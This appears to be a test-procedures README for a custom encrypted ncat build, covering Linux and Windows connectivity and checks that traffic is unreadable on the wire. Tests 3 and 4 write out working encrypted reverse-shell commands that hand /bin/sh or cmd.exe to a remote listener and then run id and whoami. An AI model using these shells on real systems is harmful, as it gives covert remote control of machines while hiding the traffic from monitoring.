# Cross-Platform Test Procedures

Manual test procedures for verifying encrypted ncat communication between Linux and Windows hosts.

## Setup Requirements

- **Linux host**: `build/ncat` binary (x86-64 ELF, statically linked)
- **Windows host**: `build/ncat.exe` binary (x86-64 PE, no DLL dependencies)
- **Network**: Both hosts must be able to reach each other on TCP (adjust firewall rules)
- **Python 3.8+** with `cryptography` package (for Wireshark key verification)
- **Wireshark** (optional, for Test 5)

Generate a shared key on either host:

```bash
python3 -c "import secrets; print(secrets.token_bytes(32).hex())"
```

Save the output as `$KEY` for all tests below.

---

## Test 1: Linux Listener + Windows Connector

Verifies that a Windows ncat.exe client can connect to a Linux ncat listener.

**On Linux:**
```bash
./build/ncat -l -p 4444 -k $KEY -e /bin/cat
```

**On Windows:**
```
build\ncat.exe 192.168.x.x 4444 -k %KEY% -e "cmd.exe /c findstr .*"
```

**Verification (from a third terminal, using Python):**
```python
# Connect to Linux listener, send data, verify echo
import socket, struct, secrets
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305

key = bytes.fromhex(KEY)
sock = socket.socket()
sock.connect(("192.168.x.x", 4444))

# Send encrypted "hello\n"
nonce = secrets.token_bytes(12)
ct = ChaCha20Poly1305(key).encrypt(nonce, b"hello\n", None)
payload = nonce + ct
sock.sendall(struct.pack('<I', len(payload)) + payload)

# Read response
hdr = sock.recv(4)
plen = struct.unpack('<I', hdr)[0]
data = sock.recv(plen)
pt = ChaCha20Poly1305(key).decrypt(data[:12], data[12:], None)
print(pt)  # Should print b'hello\n'
```

**Expected**: The echo response matches the sent data, fully encrypted on the wire.

---

## Test 2: Windows Listener + Linux Connector

Verifies that a Linux ncat client can connect to a Windows ncat.exe listener.

**On Windows:**
```
build\ncat.exe -l -p 4445 -k %KEY% -e "cmd.exe /c findstr .*"
```

**On Linux:**
```bash
./build/ncat 192.168.x.x 4445 -k $KEY -e /bin/cat
```

**Verification**: Same as Test 1, connecting to the Windows IP on port 4445.

**Expected**: Bidirectional encrypted communication works across platforms.

---

## Test 3: Encrypted Reverse Shell — Linux to Windows

A Linux machine connects back to a Windows listener, providing a Linux shell.

**On Windows (listener):**
```
build\ncat.exe -l -p 4446 -k %KEY%
```

**On Linux (connect-back with shell):**
```bash
./build/ncat 192.168.x.x 4446 -k $KEY -e /bin/sh
```

**Verification**: From the Windows side, type commands. Each command is encrypted, sent to Linux, executed by `/bin/sh`, and the output returned encrypted.

Test commands:
```
echo cross_platform_test
uname -a
id
```

**Expected**: Command output from the Linux shell appears on the Windows console. All traffic is encrypted.

---

## Test 4: Encrypted Reverse Shell — Windows to Linux

A Windows machine connects back to a Linux listener, providing a Windows shell.

**On Linux (listener):**
```bash
./build/ncat -l -p 4447 -k $KEY
```

**On Windows (connect-back with shell):**
```
build\ncat.exe 192.168.x.x 4447 -k %KEY% -e cmd.exe
```

**Verification**: From the Linux side, type commands. Each command is encrypted, sent to Windows, executed by `cmd.exe`, and the output returned encrypted.

Test commands:
```
echo cross_platform_test
hostname
whoami
```

**Expected**: Command output from the Windows shell appears on the Linux console. All traffic is encrypted.

---

## Test 5: Wireshark Verification

Confirms that no plaintext is visible on the wire.

1. Start Wireshark on either host, filtering on the test port:
   ```
   tcp.port == 4444
   ```

2. Run any of Tests 1-4.

3. In Wireshark, right-click a TCP stream and select **Follow > TCP Stream**.

4. **Verify**:
   - No readable ASCII strings in the stream (no commands, no output text)
   - Each message starts with a 4-byte length prefix
   - Payload bytes appear random (high entropy)
   - No TLS handshake — this is raw ChaCha20-Poly1305, not TLS

5. Optional entropy check with `tshark`:
   ```bash
   tshark -r capture.pcap -T fields -e data -Y "tcp.port==4444" | \
     python3 -c "
   import sys, collections, math
   data = bytes.fromhex(sys.stdin.read().strip())
   freq = collections.Counter(data)
   entropy = -sum((c/len(data)) * math.log2(c/len(data)) for c in freq.values())
   print(f'Entropy: {entropy:.2f} bits/byte (expect ~7.9+ for encrypted)')
   "
   ```

**Expected**: Entropy near 8.0 bits/byte, no plaintext visible.
